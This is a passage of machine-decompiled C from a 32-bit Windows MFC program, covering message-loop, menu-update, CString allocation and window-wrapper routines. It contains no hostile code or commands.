    if ( a2 == 1 )
      CWinThread::OnIdle(this, 1);
  }
  else
  {
    CWinThread::OnIdle(this, a2);
    v4 = *((_DWORD *)this + 32);
    a2 = 0;
    if ( v4 )
    {
      a2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 16))(v4);
      while ( a2 )
      {
        v5 = (*(int (__thiscall **)(_DWORD, int *))(**((_DWORD **)this + 32) + 20))(*((_DWORD *)this + 32), &a2);
        (*(void (__thiscall **)(int))(*(_DWORD *)v5 + 136))(v5);
      }
    }
  }
  return v2 < 1;
}

//----- (00416FF6) --------------------------------------------------------
int __thiscall sub_416FF6(char *this)
{
  int v2; // edi
  int v3; // eax
  int v5; // [esp+10h] [ebp-4h]

  v2 = 1;
  v5 = 0;
LABEL_2:
  while ( v2 )
  {
    if ( PeekMessageA((LPMSG)(this + 48), 0, 0, 0, 0) )
      break;
    v3 = v5++;
    if ( !(*(int (__thiscall **)(char *, int))(*(_DWORD *)this + 96))(this, v3) )
      v2 = 0;
  }
  while ( (*(int (__thiscall **)(char *))(*(_DWORD *)this + 92))(this) )
  {
    if ( (*(int (__thiscall **)(char *, char *))(*(_DWORD *)this + 100))(this, this + 48) )
    {
      v5 = 0;
      v2 = 1;
    }
    if ( !PeekMessageA((LPMSG)(this + 48), 0, 0, 0, 0) )
      goto LABEL_2;
  }
  return (*(int (__thiscall **)(char *))(*(_DWORD *)this + 104))(this);
}

//----- (00417075) --------------------------------------------------------
int __thiscall sub_417075(_DWORD *this, _DWORD *a2)
{
  int v2; // esi
  int v4; // esi

  v2 = a2[1];
  if ( v2 == 512 || v2 == 160 )
  {
    if ( this[23] == a2[5] && this[24] == a2[6] && v2 == this[25] )
      return 0;
    v4 = a2[6];
    this[23] = a2[5];
    this[24] = v4;
    this[25] = a2[1];
  }
  else if ( v2 == 15 || v2 == 280 )
  {
    return 0;
  }
  return 1;
}

//----- (004170CE) --------------------------------------------------------
int __thiscall sub_4170CE(_DWORD *this)
{
  return this[14];
}

//----- (004171DD) --------------------------------------------------------
int __thiscall sub_4171DD(void *this, _DWORD *a2)
{
  _DWORD *i; // esi
  unsigned int v3; // eax
  int j; // eax

  for ( i = (_DWORD *)(*(int (__fastcall **)(void *))(*(_DWORD *)this + 40))(this); i; i = (_DWORD *)*i )
  {
    v3 = a2[1];
    if ( v3 >= 0xC000 )
    {
      for ( j = unknown_libname_24(i[1], 49152, 0, 0); j; j = unknown_libname_24(j + 24, 49152, 0, 0) )
      {
        if ( **(_DWORD **)(j + 16) == a2[1] )
          goto LABEL_10;
      }
    }
    else
    {
      j = unknown_libname_24(i[1], v3, 0, 0);
      if ( j )
      {
LABEL_10:
        (*(void (__thiscall **)(void *, _DWORD, _DWORD))(j + 20))(this, a2[2], a2[3]);
        return 1;
      }
    }
  }
  return 0;
}
// 4194B4: using guessed type _DWORD __stdcall unknown_libname_24(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00417258) --------------------------------------------------------
int __thiscall sub_417258(void *this, HWND *a2)
{
  HWND v2; // eax
  struct CObject *v3; // esi
  struct CObject *v5; // eax

  if ( !*a2 && sub_4171DD(this, a2) )
    return 1;
  v2 = (HWND)sub_40A780();
  v3 = (struct CObject *)v2;
  if ( v2 )
    v2 = (HWND)*((_DWORD *)v2 + 7);
  if ( sub_419DEA(v2, a2) )
    return 1;
  if ( !v3 )
    return 0;
  v5 = sub_41878D(*a2);
  if ( sub_419C60(v5) == v3 )
    return 0;
  return (*(int (__thiscall **)(struct CObject *, HWND *))(*(_DWORD *)v3 + 144))(v3, a2);
}

//----- (0041737D) --------------------------------------------------------
int __thiscall sub_41737D(_DWORD *this, int a2, struct tagMSG *a3)
{
  HWND *v3; // eax
  HWND *v4; // eax
  HWND *v5; // edi
  int v6; // eax
  UINT message; // ecx
  int v8; // eax
  int v9; // edi
  UINT v10; // eax
  struct CNoTrackObject *Data; // eax
  struct CNoTrackObject *v12; // ebx
  int v13; // esi
  char v15[28]; // [esp+Ch] [ebp-20h] BYREF
  _DWORD *v16; // [esp+28h] [ebp-4h]

  v16 = this;
  if ( !a3 )
    return 0;
  if ( a2 )
  {
    if ( a2 != 2 )
      return 0;
    v3 = (HWND *)sub_41878D(a3->hwnd);
    if ( v3 )
    {
      v4 = sub_419C88(v3);
      v5 = v4;
      if ( v4 )
      {
        if ( CFrameWnd::IsTracking((CFrameWnd *)v4) )
        {
          if ( v5[20] )
          {
            v6 = sub_40A780();
            if ( v16[7] )
            {
              if ( (message = a3->message, message == 256) && a3->wParam == 13 || message == 514 )
              {
                SendMessageA(*(HWND *)(v6 + 28), 0x111u, 0xE146u, 0);
                return 1;
              }
            }
          }
        }
      }
    }
  }
  v8 = sub_40A780();
  v9 = v8;
  if ( (unsigned int)dword_445824 < 0x333 && v8 && IsHelpKey(a3) )
  {
    SendMessageA(*(HWND *)(v9 + 28), 0x111u, 0xE146u, 0);
    return 1;
  }
  if ( !a2 )
  {
    if ( v16[8] )
    {
      v10 = a3->message;
      if ( v10 >= 0x100 && v10 <= 0x108 )
      {
        Data = CThreadLocalObject::GetData(
                 (CThreadLocalObject *)&unk_443ACC,
                 CThreadLocal<_AFX_THREAD_STATE>::CreateObject);
        v12 = Data;
        if ( !*((_DWORD *)Data + 47) )
        {
          *((_DWORD *)Data + 47) = 1;
          qmemcpy(v15, a3, sizeof(v15));
          v13 = (int)v16;
          if ( sub_418237(v16[8]) && (*(int (__thiscall **)(int, char *))(*(_DWORD *)v13 + 88))(v13, v15) )
          {
            *((_DWORD *)v12 + 47) = 0;
            return 1;
          }
          *((_DWORD *)v12 + 47) = 0;
        }
      }
    }
  }
  return 0;
}
// 445824: using guessed type int dword_445824;

//----- (004174E2) --------------------------------------------------------
BOOL __thiscall sub_4174E2(char *this)
{
  const MSG *v2; // edi
  BOOL result; // eax

  v2 = (const MSG *)(this + 48);
  result = GetMessageA((LPMSG)(this + 48), 0, 0, 0);
  if ( result )
  {
    if ( *((_DWORD *)this + 13) != 874 && !(*(int (__thiscall **)(char *, const MSG *))(*(_DWORD *)this + 88))(this, v2) )
    {
      TranslateMessage(v2);
      DispatchMessageA(v2);
    }
    return 1;
  }
  return result;
}

//----- (00417522) --------------------------------------------------------
_DWORD *__thiscall sub_417522(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  this[1] = 1;
  this[2] = 0;
  this[3] = 0;
  this[4] = 0;
  this[5] = 1;
  this[6] = 0;
  return result;
}

//----- (0041753C) --------------------------------------------------------
int __thiscall sub_41753C(_DWORD *this)
{
  int result; // eax
  _DWORD *v2; // ecx

  result = this[4];
  v2 = this + 4;
  if ( result )
    return (*(int (__thiscall **)(_DWORD *, _DWORD *))(result + 28))(v2, this);
  return result;
}

//----- (00417567) --------------------------------------------------------
int __stdcall sub_417567(
        int a1,
        int a2,
        int a3,
        int (__thiscall *a4)(_DWORD, _DWORD),
        _DWORD *a5,
        unsigned int a6,
        _DWORD *a7)
{
  BOOL v7; // ebx
  _DWORD *v10; // esi

  v7 = 1;
  if ( !a7 )
  {
    if ( a6 <= 0x28 )
    {
      switch ( a6 )
      {
        case 0x28u:
          ((void (__thiscall *)(int, int, _DWORD, _DWORD))a4)(a1, a2, a5[1], *a5);
          return v7;
        case 2u:
          return a4(a1, a2);
        case 0xCu:
          ((void (__thiscall *)(int))a4)(a1);
          return v7;
        case 0xDu:
          a4(a1, a2);
          return v7;
        case 0x23u:
          return ((int (__thiscall *)(int))a4)(a1);
        case 0x26u:
          ((void (__thiscall *)(int, _DWORD, _DWORD))a4)(a1, a5[1], *a5);
          return v7;
        case 0x27u:
          return ((int (__thiscall *)(int, _DWORD, _DWORD))a4)(a1, a5[1], *a5);
      }
      return 0;
    }
    switch ( a6 )
    {
      case ')':
        return ((int (__thiscall *)(int, int, _DWORD, _DWORD))a4)(a1, a2, a5[1], *a5);
      case ',':
        v10 = a5;
        a4(a1, a5);
        break;
      case '-':
        v10 = a5;
        ((void (__thiscall *)(int, _DWORD *, int))a4)(a1, a5, a2);
        break;
      case '.':
        a4(a1, a5);
        return v7;
      case '/':
        return a4(a1, a5);
      default:
        return 0;
    }
    v7 = v10[7] == 0;
    v10[7] = 0;
    return v7;
  }
  *a7 = a1;
  a7[1] = a4;
  return v7;
}

//----- (0041766E) --------------------------------------------------------
int __thiscall sub_41766E(void *this, int a2, unsigned int a3, _DWORD *Buf1, _DWORD *a5)
{
  struct AFX_MODULE_STATE *ModuleState; // eax
  _DWORD *v9; // edi
  int i; // esi
  int v11; // eax
  unsigned int v12; // ebx
  _DWORD *j; // esi
  int v14; // eax
  int v15; // [esp+18h] [ebp+Ch]
  void *Buf1a; // [esp+1Ch] [ebp+10h]

  if ( a3 == -2 )
  {
    ModuleState = AfxGetModuleState();
    return (*(int (__thiscall **)(_DWORD, void *, int, _DWORD *, _DWORD *))(**((_DWORD **)ModuleState + 1038) + 4))(
             *((_DWORD *)ModuleState + 1038),
             this,
             a2,
             Buf1,
             a5);
  }
  if ( a3 == -3 )
  {
    v15 = 0;
    Buf1a = (void *)Buf1[12];
    v9 = (_DWORD *)(*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
LABEL_5:
    if ( v9 && !v15 )
    {
      for ( i = v9[1]; ; i += 12 )
      {
        v11 = *(_DWORD *)(i + 4);
        if ( !v11 || !*(_DWORD *)(i + 8) || v15 )
        {
          v9 = (_DWORD *)*v9;
          goto LABEL_5;
        }
        if ( a2 == v11 )
        {
          if ( Buf1a )
          {
            if ( *(_DWORD *)i && !memcmp(Buf1a, *(const void **)i, 0x10u) )
            {
LABEL_17:
              v15 = 1;
              Buf1[1] = *(_DWORD *)(i + 8);
              continue;
            }
          }
          else if ( !*(_DWORD *)i )
          {
            goto LABEL_17;
          }
        }
      }
    }
    return v15;
  }
  else
  {
    if ( a3 == -1 || (v12 = HIWORD(a3), a3 = (unsigned __int16)a3, !v12) )
      v12 = 273;
    for ( j = (_DWORD *)(*(int (__thiscall **)(void *))(*(_DWORD *)this + 40))(this); j; j = (_DWORD *)*j )
    {
      v14 = unknown_libname_24(j[1], v12, a3, a2);
      if ( v14 )
        return sub_417567(
                 (int)this,
                 a2,
                 a3,
                 *(int (__thiscall **)(_DWORD, _DWORD))(v14 + 20),
                 Buf1,
                 *(_DWORD *)(v14 + 16),
                 a5);
    }
    return 0;
  }
}
// 4194B4: using guessed type _DWORD __stdcall unknown_libname_24(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0041777D) --------------------------------------------------------
int __stdcall sub_41777D(int a1)
{
  return 1;
}

//----- (0041778B) --------------------------------------------------------
int sub_41778B()
{
  struct AFX_MODULE_STATE *ModuleState; // eax

  ModuleState = AfxGetModuleState();
  return (*(int (__thiscall **)(_DWORD, int))(**((_DWORD **)ModuleState + 1) + 144))(*((_DWORD *)ModuleState + 1), 1);
}

//----- (004177A0) --------------------------------------------------------
int sub_4177A0()
{
  struct AFX_MODULE_STATE *ModuleState; // eax

  ModuleState = AfxGetModuleState();
  return (*(int (__thiscall **)(_DWORD, int))(**((_DWORD **)ModuleState + 1) + 144))(*((_DWORD *)ModuleState + 1), -1);
}

//----- (004177B5) --------------------------------------------------------
void *sub_4177B5()
{
  return &unk_420470;
}

//----- (004177BB) --------------------------------------------------------
void *sub_4177BB()
{
  return &unk_420490;
}

//----- (004177C1) --------------------------------------------------------
void *sub_4177C1()
{
  return &unk_4204C0;
}

//----- (004177C7) --------------------------------------------------------
void *sub_4177C7()
{
  return &unk_4204F8;
}

//----- (004177CD) --------------------------------------------------------
void __thiscall sub_4177CD(void *this)
{
  CTypeLibCache *v2; // eax

  sub_41D756(13);
  v2 = (CTypeLibCache *)(*(int (__thiscall **)(void *))(*(_DWORD *)this + 32))(this);
  if ( v2 )
    CTypeLibCache::Unlock(v2);
  AfxUnlockGlobals(13);
  if ( this )
    (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 4))(this, 1);
}

//----- (004177FF) --------------------------------------------------------
int sub_4177FF()
{
  return 1;
}

//----- (00417803) --------------------------------------------------------
int __stdcall sub_417803(int a1)
{
  return 0;
}

//----- (00417808) --------------------------------------------------------
void *sub_417808()
{
  return &unk_420510;
}

//----- (0041780E) --------------------------------------------------------
void *sub_41780E()
{
  return &unk_420520;
}

//----- (0041783A) --------------------------------------------------------
int __thiscall sub_41783A(int this, int a2)
{
  int result; // eax
  UINT v4; // ecx
  int v5; // edi
  HWND Parent; // eax
  struct CObject *v7; // eax
  HWND v8; // ecx
  HWND NextDlgTabItem; // eax
  struct CObject *v10; // eax

  result = *(_DWORD *)(this + 12);
  if ( result )
  {
    if ( *(_DWORD *)(this + 16) )
      return result;
    v4 = a2 != 0 ? 0 : 3;
    BYTE1(v4) |= 4u;
    result = EnableMenuItem(*(HMENU *)(result + 4), *(_DWORD *)(this + 8), v4);
  }
  else
  {
    if ( !a2 )
    {
      v5 = *(_DWORD *)(this + 20);
      if ( GetFocus() == *(HWND *)(v5 + 28) )
      {
        Parent = GetParent(*(HWND *)(v5 + 28));
        v7 = sub_41878D(Parent);
        v8 = *(HWND *)(this + 20);
        if ( v8 )
          v8 = (HWND)*((_DWORD *)v8 + 7);
        NextDlgTabItem = GetNextDlgTabItem(*((HWND *)v7 + 7), v8, 0);
        v10 = sub_41878D(NextDlgTabItem);
        sub_418279((int)v10);
      }
    }
    result = CWnd::ShowWindow(*(CWnd **)(this + 20), a2);
  }
  *(_DWORD *)(this + 24) = 1;
  return result;
}

//----- (0041792C) --------------------------------------------------------
void __thiscall sub_41792C(UINT *this, int a2)
{
  (*(void (__thiscall **)(UINT *, bool))(*this + 4))(this, a2 != 0);
  if ( this[3] )
  {
    if ( !this[4] )
    {
      if ( hBitmapChecked || (_AfxLoadDotBitmap(), hBitmapChecked) )
        SetMenuItemBitmaps(*(HMENU *)(this[3] + 4), this[2], 0x400u, 0, hBitmapChecked);
    }
  }
}

//----- (00417982) --------------------------------------------------------
void __thiscall sub_417982(UINT_PTR *this, LPCSTR lpNewItem)
{
  UINT_PTR v3; // eax
  UINT MenuState; // eax

  v3 = this[3];
  if ( v3 )
  {
    if ( !this[4] )
    {
      MenuState = GetMenuState(*(HMENU *)(v3 + 4), this[2], 0x400u);
      LOWORD(MenuState) = MenuState & 0xF6FB;
      ModifyMenuA(*(HMENU *)(this[3] + 4), this[2], MenuState | 0x400, this[1], lpNewItem);
    }
  }
  else
  {
    AfxSetWindowText(*(HWND *)(this[5] + 28), lpNewItem);
  }
}

//----- (004179F3) --------------------------------------------------------
void *__cdecl sub_4179F3(size_t Size)
{
  void *v1; // esi

  v1 = malloc(Size);
  if ( !v1 && off_4276D0 )
    off_4276D0(Size);
  return v1;
}
// 4179D9: using guessed type void __noreturn sub_4179D9();
// 4276D0: using guessed type int (__cdecl *off_4276D0)(_DWORD);

//----- (00417A1C) --------------------------------------------------------
void __cdecl sub_417A1C(LPVOID lpMem)
{
  sub_40B886(lpMem);
}

//----- (00417A27) --------------------------------------------------------
CString *__thiscall sub_417A27(CString *this, LPCSTR *a2)
{
  LPCSTR v3; // eax

  v3 = *a2;
  if ( *((int *)*a2 - 3) < 0 )
  {
    *(_DWORD *)this = off_4276D4;
    CString::operator=(this, *a2);
  }
  else
  {
    *(_DWORD *)this = v3;
    InterlockedIncrement((volatile LONG *)v3 - 3);
  }
  return this;
}
// 4276D4: using guessed type void *off_4276D4;

//----- (00417A5A) --------------------------------------------------------
int sub_417A5A()
{
  sub_417A64();
  return atexit(sub_417A7F);
}

//----- (00417A64) --------------------------------------------------------
char *sub_417A64()
{
  return sub_40AE51(byte_443910, 80, 64);
}

//----- (00417A7F) --------------------------------------------------------
void __cdecl sub_417A7F()
{
  sub_40AE8D((int)byte_443910);
  DeleteCriticalSection((LPCRITICAL_SECTION)&byte_443910[16]);
}

//----- (00417A89) --------------------------------------------------------
int sub_417A89()
{
  sub_417A93();
  return atexit(sub_417AB1);
}

//----- (00417A93) --------------------------------------------------------
char *sub_417A93()
{
  return sub_40AE51(byte_4438E8, 144, 64);
}

//----- (00417AB1) --------------------------------------------------------
void __cdecl sub_417AB1()
{
  sub_40AE8D((int)&unk_4438E8);
  DeleteCriticalSection((LPCRITICAL_SECTION)((char *)&unk_4438E8 + 16));
}

//----- (00417ABB) --------------------------------------------------------
int sub_417ABB()
{
  sub_417AC5();
  return atexit(sub_417AE3);
}

//----- (00417AC5) --------------------------------------------------------
char *sub_417AC5()
{
  return sub_40AE51(byte_4438C0, 272, 64);
}

//----- (00417AE3) --------------------------------------------------------
void __cdecl sub_417AE3()
{
  sub_40AE8D((int)&unk_4438C0);
  DeleteCriticalSection((LPCRITICAL_SECTION)((char *)&unk_4438C0 + 16));
}

//----- (00417AED) --------------------------------------------------------
int sub_417AED()
{
  sub_417AF7();
  return atexit(sub_417B15);
}

//----- (00417AF7) --------------------------------------------------------
char *sub_417AF7()
{
  return sub_40AE51(byte_443898, 528, 64);
}

//----- (00417B15) --------------------------------------------------------
void __cdecl sub_417B15()
{
  sub_40AE8D((int)&unk_443898);
  DeleteCriticalSection((LPCRITICAL_SECTION)((char *)&unk_443898 + 16));
}

//----- (00417B1F) --------------------------------------------------------
void *__thiscall sub_417B1F(_DWORD *this, int a2)
{
  void *result; // eax
  int v4; // edi
  char *v5; // ecx
  _DWORD *v6; // eax

  if ( !a2 )
  {
    result = off_4276D4;
    *this = off_4276D4;
    return result;
  }
  v4 = 64;
  if ( a2 > 64 )
  {
    v4 = 128;
    if ( a2 > 128 )
    {
      v4 = 256;
      if ( a2 > 256 )
      {
        v4 = 512;
        if ( a2 > 512 )
        {
          v6 = sub_4179F3(a2 + 13);
          v6[2] = a2;
          goto LABEL_13;
        }
        v5 = (char *)&unk_443898;
      }
      else
      {
        v5 = (char *)&unk_4438C0;
      }
    }
    else
    {
      v5 = (char *)&unk_4438E8;
    }
  }
  else
  {
    v5 = (char *)&unk_443910;
  }
  v6 = sub_40AEB5(v5);
  v6[2] = v4;
LABEL_13:
  *v6 = 1;
  *((_BYTE *)v6 + a2 + 12) = 0;
  v6[1] = a2;
  result = v6 + 3;
  *this = result;
  return result;
}
// 4276D4: using guessed type void *off_4276D4;

//----- (00417BA1) --------------------------------------------------------
void __thiscall sub_417BA1(_DWORD *lpMem)
{
  int v1; // eax
  void *v2; // ecx
  _DWORD *v3; // [esp-4h] [ebp-4h]

  v1 = lpMem[2];
  switch ( v1 )
  {
    case 64:
      v3 = lpMem;
      v2 = &unk_443910;
      break;
    case 128:
      sub_40AF44((int)&unk_4438E8, lpMem);
      return;
    case 256:
      sub_40AF44((int)&unk_4438C0, lpMem);
      return;
    default:
      v3 = lpMem;
      if ( v1 != 512 )
      {
        sub_417A1C(lpMem);
        return;
      }
      v2 = &unk_443898;
      break;
  }
  sub_40AF44((int)v2, v3);
}

//----- (00417BE9) --------------------------------------------------------
volatile LONG *__thiscall sub_417BE9(void **this)
{
  volatile LONG *result; // eax

  result = (volatile LONG *)*this;
  if ( (char *)*this - 12 != off_4276D8 )
  {
    if ( InterlockedDecrement(result - 3) <= 0 )
      sub_417BA1((_DWORD *)*this - 3);
    result = (volatile LONG *)off_4276D4;
    *this = off_4276D4;
  }
  return result;
}
// 4276D4: using guessed type void *off_4276D4;
// 4276D8: using guessed type void *off_4276D8;

//----- (00417C1A) --------------------------------------------------------
void __stdcall sub_417C1A(volatile LONG *lpAddend)
{
  if ( lpAddend != off_4276D8 && InterlockedDecrement(lpAddend) <= 0 )
    sub_417BA1(lpAddend);
}
// 4276D8: using guessed type void *off_4276D8;

//----- (00417CB2) --------------------------------------------------------
void __thiscall sub_417CB2(_DWORD *this)
{
  if ( (void *)(*this - 12) != off_4276D8 && InterlockedDecrement((volatile LONG *)(*this - 12)) <= 0 )
    sub_417BA1((_DWORD *)(*this - 12));
}
// 4276D8: using guessed type void *off_4276D8;

//----- (00417CDC) --------------------------------------------------------
_DWORD *__thiscall sub_417CDC(_DWORD *this, _DWORD *a2, size_t Size, int a4, int a5)
{
  _DWORD *result; // eax

  if ( Size + a5 )
  {
    sub_417B1F(a2, Size + a5);
    return memcpy_0((void *)*a2, (const void *)(a4 + *this), Size);
  }
  else
  {
    result = a2;
    *a2 = off_4276D4;
  }
  return result;
}
// 4276D4: using guessed type void *off_4276D4;

//----- (00417D20) --------------------------------------------------------
CString *__thiscall sub_417D20(CString *this, LPCSTR lpString)
{
  int v3; // eax
  size_t v4; // edi

  *(_DWORD *)this = off_4276D4;
  if ( lpString )
  {
    if ( HIWORD(lpString) )
    {
      v3 = lstrlenA(lpString);
      v4 = v3;
      if ( v3 )
      {
        sub_417B1F(this, v3);
        memcpy_0(*(void **)this, lpString, v4);
      }
    }
    else
    {
      CString::LoadStringA(this, (unsigned __int16)lpString);
    }
  }
  return this;
}
// 4276D4: using guessed type void *off_4276D4;

//----- (00417D9F) --------------------------------------------------------
void **__thiscall sub_417D9F(void **this, const char **a2)
{
  int *v3; // ecx
  const char *v4; // eax
  const char *v5; // eax

  v3 = (int *)*this;
  v4 = *a2;
  if ( v3 != (int *)*a2 )
  {
    if ( (*(v3 - 3) >= 0 || v3 - 3 == off_4276D8) && *((int *)v4 - 3) >= 0 )
    {
      sub_417BE9(this);
      v5 = *a2;
      *this = (void *)*a2;
      InterlockedIncrement((volatile LONG *)v5 - 3);
    }
    else
    {
      CString::AssignCopy((CString *)this, *((_DWORD *)v4 - 2), *a2);
    }
  }
  return this;
}
// 4276D8: using guessed type void *off_4276D8;

//----- (00417E57) --------------------------------------------------------
void *__thiscall sub_417E57(void **this, size_t Size, void *Src, size_t a4, void *a5)
{
  void *result; // eax

  result = (void *)(Size + a4);
  if ( Size + a4 )
  {
    sub_417B1F(this, Size + a4);
    memcpy_0(*this, Src, Size);
    return memcpy_0((char *)*this + Size, a5, a4);
  }
  return result;
}

//----- (00417E95) --------------------------------------------------------
void __thiscall sub_417E95(void **this, size_t Size, void *Src)
{
  _DWORD *v4; // eax
  volatile LONG *v5; // ebx
  int v6; // ecx

  if ( Size )
  {
    v4 = *this;
    v5 = (volatile LONG *)((char *)*this - 12);
    if ( *(int *)v5 > 1 || (v6 = *(v4 - 2), (signed int)(v6 + Size) > *(v4 - 1)) )
    {
      sub_417E57(this, *(v4 - 2), v4, Size, Src);
      sub_417C1A(v5);
    }
    else
    {
      memcpy_0((char *)v4 + v6, Src, Size);
      *((_DWORD *)*this - 2) += Size;
      *((_BYTE *)*this + *((_DWORD *)*this - 2)) = 0;
    }
  }
}

//----- (00417EF4) --------------------------------------------------------
void **__thiscall sub_417EF4(void **this, CHAR *lpString)
{
  int v3; // eax

  if ( lpString )
    v3 = lstrlenA(lpString);
  else
    v3 = 0;
  sub_417E95(this, v3, lpString);
  return this;
}

//----- (00417F33) --------------------------------------------------------
_DWORD *__thiscall sub_417F33(_DWORD *this, int a2)
{
  int v3; // ecx
  _DWORD *v4; // eax
  volatile LONG *v5; // ebx
  int v6; // edi

  v3 = a2;
  v4 = (_DWORD *)*this;
  v5 = (volatile LONG *)(*this - 12);
  if ( *(int *)v5 > 1 || a2 > *(v4 - 1) )
  {
    v6 = *(v4 - 2);
    if ( a2 < v6 )
      v3 = *(v4 - 2);
    sub_417B1F(this, v3);
    memcpy_0((void *)*this, (const void *)(v5 + 3), v6 + 1);
    *(_DWORD *)(*this - 8) = v6;
    sub_417C1A(v5);
  }
  return (_DWORD *)*this;
}

//----- (00418000) --------------------------------------------------------
char **sub_418000()
{
  return &off_420798;
}
// 420798: using guessed type char *off_420798;

//----- (00418018) --------------------------------------------------------
int __thiscall sub_418018(_DWORD *this)
{
  int result; // eax
  bool v2; // zf
  int v3; // [esp+0h] [ebp-24h] BYREF
  int v4; // [esp+10h] [ebp-14h]
  int *v5; // [esp+14h] [ebp-10h]
  int v6; // [esp+20h] [ebp-4h]

  result = 0;
  v2 = this[3] == 0;
  v5 = &v3;
  if ( !v2 )
  {
    v4 = 0;
    v6 = 0;
    return ((int (*)(void))this[3])();
  }
  return result;
}

//----- (0041805E) --------------------------------------------------------
void __stdcall sub_41805E(void *a1)
{
  struct AFX_MODULE_STATE *ModuleState; // esi

  ModuleState = AfxGetModuleState();
  sub_41D756(0);
  CSimpleList::AddHead((struct AFX_MODULE_STATE *)((char *)ModuleState + 28), a1);
  AfxUnlockGlobals(0);
}

//----- (004180C5) --------------------------------------------------------
int __thiscall sub_4180C5(void *this, UINT uType, unsigned int a3)
{
  CHAR Text[512]; // [esp+0h] [ebp-204h] BYREF
  int v5; // [esp+200h] [ebp-4h] BYREF

  if ( (*(int (__thiscall **)(void *, CHAR *, int, int *))(*(_DWORD *)this + 12))(this, Text, 512, &v5) )
    return sub_41BD37(Text, uType, v5);
  if ( !a3 )
    a3 = 61472;
  return sub_41BD6F(a3, uType, v5);
}

//----- (00418176) --------------------------------------------------------
int __thiscall sub_418176(_DWORD **this, int a2, int a3, int a4)
{
  return (*(int (__thiscall **)(_DWORD *, int, int, int))(*this[13] + 84))(this[13], a2, a3, a4);
}

//----- (0041818D) --------------------------------------------------------
LONG __thiscall sub_41818D(int this)
{
  int v1; // eax

  v1 = *(_DWORD *)(this + 56);
  if ( v1 )
    return (*(int (__thiscall **)(_DWORD))(*(_DWORD *)v1 + 112))(*(_DWORD *)(this + 56));
  else
    return GetWindowLongA(*(HWND *)(this + 28), -16);
}

//----- (004181A7) --------------------------------------------------------
LONG __thiscall sub_4181A7(int this)
{
  int v1; // eax

  v1 = *(_DWORD *)(this + 56);
  if ( v1 )
    return (*(int (__thiscall **)(_DWORD))(*(_DWORD *)v1 + 116))(*(_DWORD *)(this + 56));
  else
    return GetWindowLongA(*(HWND *)(this + 28), -20);
}

//----- (00418210) --------------------------------------------------------
int __thiscall sub_418210(int this, int nCmdShow)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 56);
  if ( v2 )
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 160))(v2, nCmdShow);
  else
    return ShowWindow(*(HWND *)(this + 28), nCmdShow);
}

//----- (00418237) --------------------------------------------------------
int __thiscall sub_418237(int this)
{
  int v1; // eax

  v1 = *(_DWORD *)(this + 56);
  if ( v1 )
    return (*(int (__thiscall **)(_DWORD))(*(_DWORD *)v1 + 164))(*(_DWORD *)(this + 56));
  else
    return IsWindowEnabled(*(HWND *)(this + 28));
}

//----- (00418279) --------------------------------------------------------
struct CObject *__thiscall sub_418279(int this)
{
  int v1; // eax
  HWND v2; // eax

  v1 = *(_DWORD *)(this + 56);
  if ( v1 )
    return (struct CObject *)(*(int (__thiscall **)(_DWORD))(*(_DWORD *)v1 + 172))(*(_DWORD *)(this + 56));
  v2 = SetFocus(*(HWND *)(this + 28));
  return sub_41878D(v2);
}

//----- (0041829A) --------------------------------------------------------
void __thiscall sub_41829A(int this, int a2)
{
  HWND Parent; // eax
  _DWORD *ValueAt; // eax
  int v5; // eax

  if ( this )
  {
    if ( !*(_DWORD *)(this + 56) )
    {
      Parent = GetParent(*(HWND *)(this + 28));
      ValueAt = CMapPtrToPtr::GetValueAt((CMapPtrToPtr *)(a2 + 4), Parent);
      if ( ValueAt )
      {
        v5 = ValueAt[13];
        if ( v5 )
          (*(void (__thiscall **)(int, int))(*(_DWORD *)v5 + 140))(v5, this);
      }
    }
  }
}

//----- (004182DC) --------------------------------------------------------
UINT sub_4182DC()
{
  UINT result; // eax

  result = RegisterWindowMessageA("commctrl_DragListMsg");
  dword_4455B4 = result;
  return result;
}
// 4455B4: using guessed type int dword_4455B4;

//----- (004182ED) --------------------------------------------------------
int sub_4182ED()
{
  sub_4182F7();
  return atexit(unknown_libname_20);
}

//----- (004182F7) --------------------------------------------------------
_DWORD *sub_4182F7()
{
  return sub_418423(dword_445578, 0);
}
// 445578: using guessed type _DWORD dword_445578[15];

//----- (0041832B) --------------------------------------------------------
int sub_41832B()
{
  sub_418335();
  return atexit(unknown_libname_21);
}

//----- (00418335) --------------------------------------------------------
_DWORD *sub_418335()
{
  return sub_418423(dword_445538, 1);
}
// 445538: using guessed type _DWORD dword_445538[15];

//----- (00418369) --------------------------------------------------------
int sub_418369()
{
  sub_418373();
  return atexit(unknown_libname_22);
}

//----- (00418373) --------------------------------------------------------
_DWORD *sub_418373()
{
  return sub_418423(dword_4454F8, -1);
}
// 4454F8: using guessed type _DWORD dword_4454F8[16];

//----- (004183A7) --------------------------------------------------------
int sub_4183A7()
{
  sub_4183B1();
  return atexit(unknown_libname_23);
}

//----- (004183B1) --------------------------------------------------------
_DWORD *sub_4183B1()
{
  return sub_418423(dword_4454B8, -2);
}
// 4454B8: using guessed type _DWORD dword_4454B8[16];

//----- (004183E5) --------------------------------------------------------
_DWORD *__thiscall sub_4183E5(_DWORD *this)
{
  sub_417522(this);
  *this = &CWnd::`vftable';
  memset(this + 7, 0, 0x20u);
  return this;
}
// 420D70: using guessed type void *CWnd::`vftable';

//----- (00418407) --------------------------------------------------------
CWnd *__thiscall sub_418407(CWnd *lpMem, char a2)
{
  CWnd::~CWnd(lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (00418423) --------------------------------------------------------
_DWORD *__thiscall sub_418423(_DWORD *this, int a2)
{
  sub_417522(this);
  *this = &CWnd::`vftable';
  memset(this + 7, 0, 0x20u);
  this[7] = a2;
  return this;
}
// 420D70: using guessed type void *CWnd::`vftable';

//----- (004185C2) --------------------------------------------------------
struct CWnd *__stdcall sub_4185C2(struct CWnd *a1, unsigned int a2, CException *a3, int a4, int a5)
{
  struct CNoTrackObject *Data; // ebx
  CException *v6; // esi
  int v8; // eax
  int v9; // ecx
  struct CWnd *result; // eax
  int v11; // [esp+0h] [ebp-4Ch] BYREF
  char v12[28]; // [esp+Ch] [ebp-40h] BYREF
  struct tagRECT Rect; // [esp+28h] [ebp-24h] BYREF
